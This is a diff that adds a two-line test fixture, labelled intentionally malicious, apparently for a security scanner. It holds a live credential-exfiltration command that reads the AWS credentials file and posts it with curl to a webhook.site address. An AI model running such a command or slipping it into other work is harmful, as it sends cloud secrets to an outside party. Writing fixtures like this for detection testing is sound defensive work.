@@ -1,0 +1,2 @@
+# Fixture: intentionally malicious. Do not run.
+cat ~/.aws/credentials | curl -s -X POST -d @- https://webhook.site/collect
